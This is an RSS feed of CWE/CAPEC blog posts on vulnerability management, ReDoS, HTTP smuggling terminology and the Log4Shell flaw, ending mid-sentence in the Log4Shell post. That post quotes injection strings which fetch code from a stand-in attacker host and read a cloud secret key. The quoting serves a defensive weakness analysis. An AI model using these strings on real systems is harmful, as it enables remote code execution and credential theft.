<?xml version="1.0" encoding="UTF-8"?>
<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:cc="http://cyber.law.harvard.edu/rss/creativeCommonsRssModule.html">
  <channel>
    <title><![CDATA[Stories by CWE/CAPEC on Medium]]></title>
    <description><![CDATA[Stories by CWE/CAPEC on Medium]]></description>
    <link>https://medium.com/@CWE_CAPEC?source=rss-674e9717194c------2</link>
    <image>
      <url>https://cdn-images-1.medium.com/fit/c/150/150/1*8VGBHGh76UArC9ghdV9bfA.png</url>
      <title>Stories by CWE/CAPEC on Medium</title>
      <link>https://medium.com/@CWE_CAPEC?source=rss-674e9717194c------2</link>
    </image>
    <generator>Medium</generator>
    <lastBuildDate>Thu, 05 May 2022 22:36:41 GMT</lastBuildDate>
    <atom:link href="https://medium.com/@CWE_CAPEC/feed" rel="self" type="application/rss+xml" />
    <webMaster><![CDATA[yourfriends@medium.com]]></webMaster>
    <atom:link href="http://medium.superfeedr.com" rel="hub" />
    <item>
      <title><![CDATA[The Missing Piece in Vulnerability Management]]></title>
      <link>https://medium.com/@CWE_CAPEC/the-missing-piece-in-vulnerability-management-c8c7c0e55e5f?source=rss-674e9717194c------2</link>
      <guid isPermaLink="false">https://medium.com/p/c8c7c0e55e5f</guid>
      <category><![CDATA[vulnerability-management]]></category>
      <category><![CDATA[information-security]]></category>
      <category><![CDATA[information-technology]]></category>
      <category><![CDATA[pentesting]]></category>
      <category><![CDATA[cybersecurity]]></category>
      <dc:creator><![CDATA[CWE/CAPEC]]></dc:creator>
      <pubDate>Wed, 04 May 2022 13:21:41 GMT</pubDate>
      <atom:updated>2022-05-05T17:12:32.887Z</atom:updated>
      <content:encoded><![CDATA[<p><em>The </em><a href="https://cwe.mitre.org"><em>CWE</em></a><em>/</em><a href="https://capec.mitre.org"><em>CAPEC</em></a><em> Program partners with organizations around the world to further the program’s mission and objectives. We are pleased to welcome one of our key partners, </em><a href="https://attackforge.com/"><em>AttackForge</em></a><em>, which has composed this posting for our blog. The views and opinions expressed do not necessarily state or reflect those of the CWE/CAPEC Program, and any reference to a specific product, process, or service does not constitute or imply an endorsement by the CWE/CAPEC Program of the product, process, or service, or its producer or provider.</em></p><figure><img alt="The Missing piece by Stiller Beobachter" src="https://cdn-images-1.medium.com/max/599/1*lD_ujAIOwFmdDHtIui4ZHw.png" /></figure><p>I would like to share my views on one of the biggest challenges I see in the vulnerability management (VM) space — normalization of pen testing results so that they can be merged with vulnerability management systems — and how <a href="https://capec.mitre.org/">Common Attack Pattern Enumeration and Classification (CAPEC™)</a> is part of the solution to that problem.</p><p>I’ve been in pen testing for the last decade, helping companies establish and improve their pen testing programs. I’ve worked for a large consultancy; run my own consultancy; and more recently as one of the co-founders at <a href="https://attackforge.com/">AttackForge</a>, focusing on process improvement for pen testing.</p><p><strong>Vulnerability Management</strong></p><p>Let’s start with: what is vulnerability management?</p><p>Vulnerability management is the process of identifying, normalizing, evaluating, treating, and then reporting on security vulnerabilities in systems. Some organizations have large teams dedicated to just this. They collect data and report back to executives to inform if the company is getting better or worse at closing security gaps.</p><p>When we consider what data goes into vulnerability management, we should consider data from vulnerability scanners, static analysis tools, as well as pen test findings. However, most organizations fail to incorporate pen test data into vulnerability management. There’s good reason for it, but first: why is it a problem?</p><p><strong>Pen Testing Data</strong></p><p>Pen testing data usually produces complex and arbitrary vulnerabilities, such as zero-day vulnerabilities or vulnerabilities in business logic. If vulnerability management can’t see these often-critical vulnerabilities, they likely never get fixed.</p><p>In vulnerability management, vulnerabilities are the input. Tools do all the crunching and normalization. The output is the known security posture for an asset. Risk teams use this when deciding what to fix and when.</p><p>Vulnerability scanners and static application security testing (SAST)<strong> </strong>tools usually include industry references and tags when registering vulnerabilities in VM tools, such as CAPEC, <a href="https://cwe.mitr.org">Common Weakness Enumeration (CWE™)</a>, and <a href="https://www.cve.org">CVE</a>. This allows for efficient and effective normalization.</p><p>When it comes to pen test findings, at most you might get a <a href="https://www.first.org/cvss/">Common Vulnerability Scoring System (CVSS)</a>, but that alone is not enough to normalize the data. Most pen test findings will not have a CVE. They may have a CAPEC or CWE, if your pen testers like you. And to make matters worse, pen test data is arbitrarily defined based on how the pen tester feels at the time.</p><p><em>This makes normalization impossible.</em></p><p>Most VM tools struggle to bring pen test data into vulnerability management.</p><p>The deliverable from a pen test is usually human-readable, for example a static PDF or Doc report. Pen testers spend days and weeks creating the perfect report, to avoid making the report feel pre-canned. You’re not going to get the same report from two different vendors, or even two different pen testers.</p><p>You can see for yourself if you search in Google for “GitHub Pen Test reports”. The first link you’ll find is to Julio Cesar Fort’s public GitHub repository, which is quite popular. It has samples from companies all over the world. You can browse through each one, and you’ll start to see the problem — inconsistency in pen test data, causing a major bottleneck for vulnerability management.</p><p><strong>Normalized Findings</strong></p><p>How do we turn those static reports into normalized findings?</p><p>The definitions and recommendations for vulnerabilities change between each pen tester or person doing quality assessments (QA). There’s no easy way to determine if they are the same ones you are tracking in VM.</p><p>Even if you receive the data in a consistent format with CVSS, CWE, and CAPEC references, how do you get that into your VM tools to process it? They were never designed to deal with arbitrary data or multiple tagging.</p><p>This combination of problems, starting with how pen testing is done, the deliverables and the output, to the current state of VM tools, implies that pen test data is unlikely to be included in your vulnerability management system.</p><p>So how do we actually fix it?</p><p><strong>The Solution</strong></p><p>First, we need an industry standard for tagging pen test findings. Something easy to understand and use, which VM tools can incorporate — similar to CVE and CVSS. This standard would need to handle different types of vulnerabilities: application, API, infrastructure, mobile, thick clients, IoT, etc. I see CAPEC as a natural fit to solving this.</p><p>We also need to train people to use this standard. This would finally allow to compare apples with apples.</p><p>Once we have standardized tagging and structured vulnerability fields, we need to get this to security teams in machine-readable formats.</p><p>Finally, VM tools can incorporate this into their processes, and normalize pen test findings. Humans will be able to see pen test vulnerabilities inside VM tools, take action, and report on them. Ultimately more things will get fixed.</p><p>In summary, I consider the solution to this problem is standardization and collaboration. We need to work together and not against each other to stay one step ahead of the bad folks.</p><p>– Fil Filiposki, co-founder of <a href="https://attackforge.com/">AttackForge</a></p><p><em>Have a topic you would like to share about CWE/CAPEC? Please contact us at </em><a href="mailto:capec@mitre.org"><em>capec@mitre.org</em></a><em> or </em><a href="mailto:cwe@mitre.org"><em>cwe@mitre.org</em></a><em>!</em></p><img src="https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=c8c7c0e55e5f" width="1" height="1" alt="">]]></content:encoded>
    </item>
    <item>
      <title><![CDATA[New CWE Entry, CWE-FFFF: Use of a Potentially Dangerous Electronic Programmable Machine to…]]></title>
      <link>https://medium.com/@CWE_CAPEC/new-cwe-entry-cwe-ffff-use-of-a-potentially-dangerous-electronic-programmable-machine-to-d4531a85019b?source=rss-674e9717194c------2</link>
      <guid isPermaLink="false">https://medium.com/p/d4531a85019b</guid>
      <dc:creator><![CDATA[CWE/CAPEC]]></dc:creator>
      <pubDate>Fri, 01 Apr 2022 11:37:57 GMT</pubDate>
      <atom:updated>2022-04-01T11:37:57.710Z</atom:updated>
      <content:encoded><![CDATA[<h3><strong>New CWE Entry, CWE-FFFF: Use of a Potentially Dangerous Electronic Programmable Machine to Automatically Carry Out Sequences of Arithmetic or Logical Operations (‘You are Using a Computer’)</strong></h3><figure><img alt="" src="https://cdn-images-1.medium.com/max/544/1*CRhnjmeVaNkOHk-vg4KBlQ.png" /></figure><p>On the CWE team, we know that identifying the root cause weakness of a vulnerability is not always a straight-forward and easy task. We also know that in order to do so, the CWE corpus must be as complete as possible so that each new CVE® record can reference at least one underlying cause. To this end, CWE is introducing a new entry, <strong>CWE-FFFF: Use of a Potentially Dangerous Electronic Programmable Machine to Automatically Carry Out Sequences of Arithmetic or Logical Operations (‘You are Using a Computer’)</strong>.</p><p>Everyone knows that it is much easier to mess things up at scale when you use a computer. To imagine this new CWE in action, let’s say you find a new XSS vulnerability, and you aren’t sure whether to map it to CWE-79:<strong> </strong>Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’) or one of its many children. Just slap a CWE-FFFF on it and you are good to go!</p><p>Imagine the time you can save in mapping your CVE records to their underlying root causes. As virtually all CVEs involve using a computer, just submit a CVE with a CWE-FFFF. You can create thousands of new CVEs, boosting your resume and career. We’re sure that there are plenty of times computers did not do what you wanted them to.</p><p>Also, CWE-FFFF is great for situations where you want to generate more revenue or sound impressive.</p><p>To generate revenue:</p><p>Client: “I can’t get it to work, can you look at it?”</p><p>You (poking the computer with a stick a few times): “Looks like you have a classic CWE-FFFF weakness. I can estimate that it will take me 20 hours to know better what is going on. Do you want to sign a contract?”</p><p>To impress others:</p><p>You: “I’m glad you came to me with your problem. I immediately see what is wrong, we just have to fix the CWE-FFFF problem. They are hard to discover.”</p><p>Others: “Wow, you are so smart and knowledgeable. I really respect that you know so much about computers, let me buy you lunch.”</p><p>Some might say that CWE-FFF is the weakness that underlies all of society’s vulnerabilities, but remember, there were problems before Grace Hopper discovered the first real bug.</p><p>In our next blog, we will cover the related attack pattern for CWE-FFFF, namely <strong>CAPEC-EEEE: Denial of Electron Transmissibility (‘Unplugging the Computer’)</strong>. It’s just coincidence how the ID matches the sound that people make when an adversary tries that.</p><p><strong>But seriously, folks…</strong></p><p><strong>You might have noticed that we released this on April 1st. We wrote this blog to highlight the fact that while most try to find the actionable and relevant CWE-mappings for their CVE records, a minority of folks overly rely on very broad, class-level weaknesses like CWE-20: Improper Input Validation or CWE-284: Improper Access Control. These mappings make it hard for defenders to know what compensating controls are best to put in place while waiting to patch. Additionally, it does not help the community determine what specific weakness are the most common, so that they can focus on fixes for them. So, as you continue discovering new vulnerabilities, try and take that extra moment to consider actionability and the appropriate level of specificity when you map them to their related CWEs.</strong></p><img src="https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=d4531a85019b" width="1" height="1" alt="">]]></content:encoded>
    </item>
    <item>
      <title><![CDATA[Celebrating the 15th anniversary of CAPEC™]]></title>
      <link>https://medium.com/@CWE_CAPEC/y-celebrating-the-15th-anniversary-of-capec-43c2b8d705e1?source=rss-674e9717194c------2</link>
      <guid isPermaLink="false">https://medium.com/p/43c2b8d705e1</guid>
      <dc:creator><![CDATA[CWE/CAPEC]]></dc:creator>
      <pubDate>Wed, 23 Mar 2022 00:27:57 GMT</pubDate>
      <atom:updated>2022-03-23T15:11:15.004Z</atom:updated>
      <content:encoded><![CDATA[<figure><img alt="Happy Anniversary Cake" src="https://cdn-images-1.medium.com/max/1024/1*lYaLKWReeDv8Cvs5sRCm5A.jpeg" /><figcaption>CAPEC is not a piece of cake…</figcaption></figure><p>March 2022 is the 15th anniversary of <a href="https://capec.mitre.org/">Common Attack Pattern Enumerations and Classifications (CAPEC™)</a>. On this important milestone, we thought we would reflect on the development of the project and the plans for the future, with collaboration of the CAPEC community.</p><p>The idea of a software design pattern had been around for quite some time [1], when security researchers realized it could be used to describe cyber-attacks [2]. With support from DHS, Cigital (later part of Synopsys) and MITRE created the “Common Attack Pattern Enumeration and Classification (CAPEC)” in 2006 as a corpus of “‘”attack patterns’”— or design patterns for attackers. At the time, <a href="https://cwe.mitre.org/">Common Weakness Enumeration (CWE™)</a> was already in development and CAPEC initially focused on how attackers exploit CWEs to enable attacks. This type of information is valuable to the community as it helps organizations better manage cyber risk and avoid/mitigate the types of mistakes and attacks that put enterprises at risk. CAPEC 1.0 was released 15 years ago this month and contained 91 attack patterns. CAPEC and CWE were part of the MITRE/DHS establishment of various corpuses under the umbrella concept of “Making Security Measurable”.</p><p>In 2010, CAPEC’s scope extended beyond software with the inclusion of attack patterns across three additional domains — social engineering, physical security, and supply chain. These entries were often less based on the traditional exploitation of a CWE, which at the time still included only software-related weaknesses. In collaboration with community stakeholders across academia, government, and industry, CAPEC grew to 450 entries.</p><p>From the beginning, CAPEC has engaged its user community to find ways of increasing its value and utility. The CAPEC team has worked with the OWASP, WASC, and MITRE <a href="https://attack.mitre.org/">ATT&amp;CK</a> teams over the years to integrate information and expand coverage. CAPEC grew to be recognized as a vital corpus of cyber security information. ITU recommended CAPEC in 2013 [3] and ISO included CAPEC in its technical report in 2015 [4]. Adam Shostack, who developed STRIDE at Microsoft, commented in his seminal book “Threat Modeling: Designing for Security” [5] as “The impressive size and scope of CAPEC may … make it easier to use for someone who’s just getting started in security, where specificity helps to identify attacks.”</p><p>Many individuals have been responsible for the concept and the development of CAPEC over the years. It is difficult to name them all, but we would like to especially mention and thank the following people: Gary McGraw, Sean Barnum, Bob Martin, Joe Jarzombek, Mark Loveless, Drew Buttner, Eric Dalci, Romain Gaucher, Tom Stracener, Pravir Chandra and Rich Struse.</p><p>As of February 2022, when <a href="https://capec.mitre.org/data/index.html">CAPEC version 3.7</a> was released; there are 546 attack patterns in the corpus. Looking forward, CAPEC hopes to continue improving and modernizing the program through direct engagement with community stakeholders in several key areas:</p><ul><li>Supply chain domain</li><li>Better integration with CWE (especially with its expansion into the hardware domain)</li><li>User experience (e.g., a more dynamic website, a REST API)</li><li>Develop a lesson plan using CWE/CAPEC for use in university curriculum</li><li>Entry completeness and quality throughout the corpus</li></ul><p>These are challenging tasks that require community input and contributions, and there are many ways for you to get involved. Consider joining the <a href="https://cwe.mitre.org/news/index.html#june102021_Join_the_CWE_CAPEC_User_Experience_Working_Group">CWE/CAPEC User Experience Working Group</a> or one of the other community groups mentioned on the landing page of the CWE and CAPEC sites. Other working groups and special interest groups are in the works, including one related to the REST API.</p><p>We invite you to be a part of the future of CWE/CAPEC!</p><p>A big thanks from the community to Rich Piazza as the primary author of this blog and the CAPEC lead for letting the community know what is going on.</p><p><strong>References</strong></p><p>[1] E. Gamma, R. Helm, R. Johnson and J. Vlissides, Design Patterns: Elements of Reusable Object-Oriented Software, Addison-Wesley, 1995.</p><p>[2] McGraw, Gary. Software Security: Building Security In. Boston, MA: Addison-Wesley, 2006</p><p>[3] <a href="https://www.itu.int/ITU-T/recommendations/rec.aspx?rec=11753">https://www.itu.int/ITU-T/recommendations/rec.aspx?rec=11753</a></p><p>[4] <a href="https://www.iso.org/standard/68837.html">https://www.iso.org/standard/68837.html</a></p><p>[5] A. Shostack, Threat Modeling: Designing for Security, John Wiley &amp; Sons, 2014</p><img src="https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=43c2b8d705e1" width="1" height="1" alt="">]]></content:encoded>
    </item>
    <item>
      <title><![CDATA[Mind your REGEX or it can put your program into an infinite loop]]></title>
      <link>https://medium.com/@CWE_CAPEC/mind-your-regex-or-it-can-put-your-program-into-an-infinite-loop-3a5f362f8300?source=rss-674e9717194c------2</link>
      <guid isPermaLink="false">https://medium.com/p/3a5f362f8300</guid>
      <dc:creator><![CDATA[CWE/CAPEC]]></dc:creator>
      <pubDate>Tue, 01 Feb 2022 19:39:16 GMT</pubDate>
      <atom:updated>2022-03-23T22:35:25.423Z</atom:updated>
      <content:encoded><![CDATA[<figure><img alt="REGEX that matches the chours of “Never going to Give you Up”" src="https://cdn-images-1.medium.com/max/975/1*6FZnd4ePPyMvGuVWy2V8rg.png" /></figure><p>If your project uses or implements <a href="https://en.wikipedia.org/wiki/Regular_expression">regular expressions</a>, you need to check them for a weakness that might allow an attacker to stop your program from working. Regular expressions, also known as regex, allow programmers to parse or replace text with a common notation. If your project takes in input, there is a good chance that you will eventually need to use this tool.</p><p>In <a href="https://web.archive.org/web/20031120114522/http:/www.cs.rice.edu/~scrosby/hash/slides/USENIX-RegexpWIP.2.ppt">2003</a>, there was a presentation about a weakness in the implementation of specific ways that these expressions were implemented. While a select community knew about this weakness for a long time, this was popularized in 2021 under the name <a href="https://blog.doyensec.com/2021/03/11/regexploit.html">Regexploit</a> or <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">ReDoS</a>. If an attacker has a specifically crafted input, some implementations could cause a CPU to run at 100% for years. As an example, this weakness led to a vulnerability reported in February 2020 (<a href="https://www.cve.org/CVERecord?id=CVE-2020-5243">CVE-2020–5243</a>) where parsing HTTP(S) User-Agent strings could shut down a web server.</p><p>The denial of service results when the regex is looking to match repeated characters and tries multiple ways of matching them. It does this by trying the longest string that would match and then repeatedly trying smaller strings until success or failure — a process feature called <a href="https://en.wikipedia.org/wiki/ReDoS#Exponential_backtracking">backtracking</a>. A recent CWE, <a href="https://cwe.mitre.org/data/definitions/1333.html">CWE-1333: Inefficient Regular Expression Complexity</a>, provides more details on the issue that can also be demonstrated in a <a href="https://regex101.com/r/m4lsbq/4">useful tool called regex101</a>. The tool shows how removing underscores (_) in the input reduces the number of processing steps.</p><p><strong>What Can You and Your Team Do?</strong></p><p>1. Don’t use regex that support <a href="https://stackoverflow.com/questions/48611167/prevent-backtracking-on-regex-to-find-non-comment-lines-not-starting-with-inden">backtracking</a>. If your programming language uses a backtracking system by default and you can’t limit regexes to those that would support backtracking, look for a library that does not use this method. These could be <a href="https://github.com/google/re2/issues/204">slower</a> and might not support capture groups (e.g., the <a href="https://github.com/google/re2">re2</a> libraries).</p><p>2. If you must use regex with backtracking:</p><p>a. Limit the exposure of untrusted input into your regexes.</p><p>b. Break up your regex into separate lines to minimize backtracking.</p><p>c. See if you can mark sensitive parts of your regex to not use backtracking.</p><p>d. Provide functionality that would normally be provided with backtracking outside of regex. (e.g., to remove whitespace, use strip and trim functions). Test regex in the <a href="https://github.com/doyensec/regexploit">Regexploit</a> tool.</p><p>e. Limit input length (with some expressions being <a href="https://en.wikipedia.org/wiki/Big_O_notation">O³ or O⁴</a>, the amount of work that can be requested for a small input string can be rather large).</p><p>f. Set up a system to limit the time your regexes can run and report when they cause a catastrophic failure so you can test and fix these.</p><p>There are several real-world examples of products that have fallen victim to this weakness. Due to the lack of <a href="https://www.regular-expressions.info/refcapture.html">capture groups</a>, the popular network security monitor <a href="https://zeek.org/">Zeek</a> uses <a href="https://github.com/zeek/zeek/issues/426">backtracking</a>. Thus, users might create a regex filter that could lead to a denial of service. Historically, popular command-line tools ‘grep’ and ‘awk’ had this issue and were <a href="https://swtch.com/~rsc/regexp/regexp1.html">replaced</a> in 2004–2005 with safer versions. <a href="https://capec.mitre.org/data/definitions/492.html">CAPEC-492: Regular Expression Exponential Blowup</a> describes the process, or attack pattern, that an adversary takes to exploit CWE-1333: Inefficient Regular Expression Complexity. If you don’t want your software to be shut down during a critical time, understanding and avoiding this weakness is critical.</p><img src="https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=3a5f362f8300" width="1" height="1" alt="">]]></content:encoded>
    </item>
    <item>
      <title><![CDATA[HTTP Desync: The Redux and Evolution of HTTP Smuggling and Splitting Attack Techniques]]></title>
      <link>https://medium.com/@CWE_CAPEC/http-desync-the-redux-and-evolution-of-http-smuggling-and-splitting-attack-techniques-a698c265c9a1?source=rss-674e9717194c------2</link>
      <guid isPermaLink="false">https://medium.com/p/a698c265c9a1</guid>
      <category><![CDATA[cybersecurity]]></category>
      <dc:creator><![CDATA[CWE/CAPEC]]></dc:creator>
      <pubDate>Wed, 12 Jan 2022 17:00:40 GMT</pubDate>
      <atom:updated>2022-01-12T19:27:49.175Z</atom:updated>
      <content:encoded><![CDATA[<figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*QbThbMnKCJDj0612qBSgPw.jpeg" /><figcaption>Credit: <a href="https://www.pexels.com/@padrinan">Miguel Á. Padriñán</a></figcaption></figure><p><em>A special thanks to Adam Chaudry for his contribution to this blog.</em></p><p><strong>A Brief History of HTTP Boundary-Based Attacks</strong></p><p>Anyone familiar with modern telecommunications understands the fundamental importance of HTTP as the foundation for information exchange across the World Wide Web. HTTP supports the implementation of client-server connections that underpin web browsing and communication via HTTP messages. This includes HTTP requests configured and sent from a client to request data/resources from a server, as well as HTTP responses from a server back to the client with requested items or a status message.</p><p>However, throughout the early 2000s, vulnerabilities were identified within HTTP infrastructure, opening the door for a set of related attack patterns/techniques against HTTP agents. Such attacks include HTTP request splitting, HTTP response splitting, HTTP request smuggling, and HTTP response smuggling.</p><p>These attacks exploit message parsing vulnerabilities against HTTP agents running HTTP/1.0/1.1, by manipulating HTTP messages (request and/or response) to interfere with the HTTP agents’ interpretation of HTTP messages. This results in unauthorized and malicious HTTP messages being secretly sent and received to allow attacks such as cross-site scripting (XSS), cache poisoning, authentication bypass, content spoofing, resource location spoofing, session hijacking, and more.</p><p>The revelation of these attack techniques was made known to the Information Technology and Information Security communities in the early 2000s by various whitepapers and reports, such as the 2004 Sanctum Inc. Whitepaper <a href="https://dl.packetstormsecurity.net/papers/general/whitepaper_httpresponse.pdf">Divide and Conquer</a> and the 2005 Watchfire whitepaper <a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf">HTTP Request Smuggling</a>. These types of attack plagued the security of HTTP web applications for years, with relevant CVEs still being released to this day.</p><p>Although there has been a concerted effort to evolve the HTTP protocol to address the weaknesses behind these attacks, many HTTP agents are still not <a href="https://www.rfc-editor.org/">RFC</a> complaint. This resulted in the configuration of HTTP infrastructure to accommodate varied HTTP agents, causing parsing discrepancies to exist in network paths interpreting HTTP messages. These discrepancies have continued allowing HTTP Smuggling and Splitting to take place.</p><p><strong>Terminology Confusion of HTTP Request/Response Splitting/Smuggling</strong></p><p>Despite being very commonplace in web-based attacks, there has been a lot of confusion about HTTP smuggling and splitting in the lexicon of IT security professionals. Many misunderstand the differences among these four attack techniques and often use the terms interchangeably. Additionally, most of the material pertaining to these attacks reference outdated sources from over 10 years ago and don’t incorporate the evolutions of the attacks.</p><p>James Kettle, Director of Research at PortSwigger, brought this topic back into the limelight with <a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">HTTP Desync Attacks: Request Smuggling Reborn</a>, where he elaborates on new attack vectors and variants tied to HTTP request smuggling. Kettle uses the term “HTTP Desync” to describe this evolution of HTTP smuggling but does not explicitly define the term. For the CAPEC/CWE projects, we are defining HTTP Desync as “the modification/manipulation of HTTP message headers, request-line and body parameters to disrupt and interfere in the interpretation and parsing of HTTP message lengths/boundaries for consecutive HTTP messages by HTTP agents in a HTTP chain or network path.”</p><p><strong>CAPEC Redux of HTTP Desync Entries</strong></p><p>Kettle’s publication inspired the CAPEC Content Team to review and reevaluate four relevant CAPEC entries. It was determined, after extensive research, that significant improvements were needed to properly differentiate these attacks. We considered combining the two Splitting CAPEC entries and the two Smuggling entries, but the nuanced differences between the four entries indicated that all four should be retained but fully re-written to make those differences clear.</p><p>Also, it is important to note the difference between HTTP splitting and HTTP smuggling, since HTTP smuggling evolved from previous HTTP splitting patterns which are commonly remediated against. HTTP splitting is defined by <a href="https://web.archive.org/web/20190114230829/http:/www.securiteam.com/securityreviews/5CP0L0AHPC.html">Amit Klein</a> as “the act of forcing a sender of (HTTP) messages to emit data stream consisting of more messages than the sender’s intension…the messages sent are 100% valid and RFC compliant.” Klein goes on to define HTTP Smuggling as “the act of forcing a sender of (HTTP) messages to emit [a] data stream which may be parsed as a different set of messages (i.e. dislocated message boundaries) than the sender’s intention…this is done by virtue of forcing the sender to emit non-standard messages which can be interpreted in more than one way.”</p><p>Ultimately, HTTP splitting is solely dependent upon the embedding/injection of special characters and character encoding within HTTP headers and web/browser object parameters. In contrast, HTTP smuggling does not, and it simply depends upon discrepancies in the interpretation of various HTTP headers.</p><p><strong>The Updated Entries</strong></p><p>Check out the new CAPECs here:</p><ol><li>HTTP Request Smuggling (<a href="https://capec.mitre.org/data/definitions/33.html">CAPEC-33</a>)</li></ol><p>2. HTTP Response Smuggling (<a href="https://capec.mitre.org/data/definitions/273.html">CAPEC-273</a>)</p><p>3. HTTP Request Splitting (<a href="https://capec.mitre.org/data/definitions/105.html">CAPEC-105</a>)</p><p>4. HTTP Response Splitting (<a href="https://capec.mitre.org/data/definitions/34.html">CAPEC-34</a>)</p><p>Our next step will be to make appropriate changes to CWE to better characterize the weaknesses that enable these four attacks to be conducted.</p><img src="https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=a698c265c9a1" width="1" height="1" alt="">]]></content:encoded>
    </item>
    <item>
      <title><![CDATA[Neutralizing Your Inputs: A Log4Shell Weakness Story]]></title>
      <link>https://medium.com/@CWE_CAPEC/neutralizing-your-inputs-a-log4shell-weakness-story-89954c8b25c9?source=rss-674e9717194c------2</link>
      <guid isPermaLink="false">https://medium.com/p/89954c8b25c9</guid>
      <category><![CDATA[vulnerability-management]]></category>
      <category><![CDATA[log4j]]></category>
      <category><![CDATA[java]]></category>
      <category><![CDATA[apache]]></category>
      <category><![CDATA[log4shell]]></category>
      <dc:creator><![CDATA[CWE/CAPEC]]></dc:creator>
      <pubDate>Fri, 17 Dec 2021 17:48:15 GMT</pubDate>
      <atom:updated>2022-01-05T16:20:30.496Z</atom:updated>
      <content:encoded><![CDATA[<figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*Hygx67ieBXMbzH6e_oj6Pg.jpeg" /><figcaption>Source: <a href="https://picryl.com/media/moving-logs-1917-7cb2cd">https://picryl.com/media/moving-logs-1917-7cb2cd</a></figcaption></figure><p>The recent vulnerability in log4j (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228">CVE-2021–44228</a>), also called “Log4Shell,” has received a lot of attention because of how dangerous and <a href="https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592">widespread</a> it is. Defenders in vulnerability management and incident response will likely be very busy with this one for a while.</p><p>While Log4Shell has been a hot topic, there hasn’t been much discussion about the original mistakes made, i.e., the weaknesses involved, and how the initial failure to address the root cause weakness led to additional pain (and multiple fixes) for defenders within the first week of disclosure. Also, you might have noticed how the same CVE was mapped to different CWEs by multiple sources. Let’s look a little deeper into the weakness that started it all.</p><p><strong>Getting to Root Cause — The Initial Mistake</strong></p><p>An important aspect of the vulnerability is that log4j can treat substrings of the form “${xyz}” as executable expressions. Here, the “$” and “{}” characters are <a href="https://cwe.mitre.org/documents/glossary/index.html#Special%20Element">special elements</a> that change how the string is generated: the contents of the “${xyz}” sequence are executed like code. The <a href="https://cybersecurity.ieee.org/blog/2015/11/13/avoiding-the-top-10-security-flaws/">mixture of control logic (or commands) with data in the same string or message</a> is a commonly known, ubiquitous design flaw in many protocols, functions, and languages, which can make it very easy for programmers to introduce vulnerabilities where malicious data is treated as a command. It doesn’t take much imagination to see that things could get really bad, really quick.</p><p>As seen in many exploit examples for this vulnerability, the attacker can inject executable expressions by using the “${xyz}” style format. However, injection is an attack. The key weakness consists of log4j not “neutralizing” potentially dangerous inputs that contain special elements, which are later fed to a command interpreter. The CWE glossary defines <a href="https://cwe.mitre.org/documents/glossary/index.html#Neutralization">neutralization</a> as “the process of ensuring that input or output has certain security properties before it is used,” which broadly includes protection mechanisms such as filtering, canonicalization, validation, etc. The high-level class <a href="https://cwe.mitre.org/data/definitions/74.html">CWE-74</a> covers improper neutralization, with many well-known descendants related to SQL injection (CWE-89), OS command injection (CWE-78), and others.</p><p>For this log4j issue, the most precise CWE available is <a href="https://cwe.mitre.org/data/definitions/917.html">CWE-917</a>: Improper Neutralization of Special Elements used in an Expression Language Statement (‘Expression Language Injection’). This entry could be found by navigating the sub-tree under CWE-74, or by knowing that the “${}” sequences are called expression language. Through the <a href="https://cwe.mitre.org/news/index.html#june102021_Join_the_CWE_CAPEC_User_Experience_Working_Group">User Experience Working Group</a>, we’re trying to find ways to make CWE easier to use, so that it’s easier to find the best match.</p><p><strong>CWE Mapping — Your Mileage May Vary</strong></p><p>So, why isn’t CWE-917 universally used for Log4Shell? Part of it comes down to the perspective of the person who is mapping to CWE and how deeply they have analyzed the mistake that created the vulnerability.</p><p>Consider a common exploit string that is injected into various inputs that are eventually processed by log4j:</p><p>${jndi:ldap://adversary.example.com/payload}</p><p>As <a href="https://www.crowdstrike.com/blog/log4j2-vulnerability-analysis-and-mitigation-recommendations/">described</a> elsewhere, this expression triggers a call to an adversary-controlled server that returns a Java class with malicious code that is then executed by log4j. This process effectively involves deserialization, so people might map this to <a href="https://cwe.mitre.org/data/definitions/502.html">CWE-502</a>: Deserialization of Untrusted Data. However, the ability to inject code is a consequence (or technical impact) resulting from the exploitation of the actual weakness, which is allowing attacker-injected expressions to trigger the download of the malicious code in the first place.</p><p>There are also exploits that involve accessing sensitive information, such as using “${env:AWS_SECRET_ACCESS_KEY}” to <a href="https://blog.talosintelligence.com/2021/12/apache-log4j-rce-vulnerability.html">read an environment variable containing a secret API key</a>. Because information is leaked, somebody might map the issue to <a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200</a>: Exposure of Sensitive Information to an Unauthorized Actor.</p><p>At best, for this particular vulnerability, CWE-502 and CWE-200 are “resultant” from the original mistake. They are part of a chain of insecure behaviors that are enabled by the “root cause” weakness, improperly neutralizing expressions (i.e., CWE-917). If an expression language is very powerful, dozens of CWEs could be “resultant” from the mistake of simply allowing the expression language to be processed. Our <a href="https://cwe.mitre.org/documents/cwe_usage/guidance.html">CWE mapping guidance</a> generally discourages mapping to a CWE if it’s effectively a “technical impact” stemming directly from a root cause CWE, instead of a completely independent mistake.</p><p>Many people thinking about the root cause might simply regard this problem as “improper input validation” (<a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20</a>), but that’s a very general concept — a high-level class weakness type. Also, you can’t always validate whether incoming data is correct or not. Here, log4j is a general-purpose logging product that basically needs to accept log messages with arbitrary contents (since the messages will vary widely depending on the particular app using log4j). So, CWE-917 (as a base-level weakness) remains more precise and a better choice.</p><p>If you look at the <a href="https://logging.apache.org/log4j/2.x/security.html">fixes</a> for this weakness, these special elements are basically treated as regular characters by simply not processing them anymore. Now THAT’s neutralization! Early fixes attempted to minimize what functionality the attackers can access, although it was found that some other expression variants could still be processed.</p><p><strong>The Final Word — What to Do and Not Do</strong></p><p>Many developers or other defenders might be tempted to choose a quick-and-dirty fix by using a 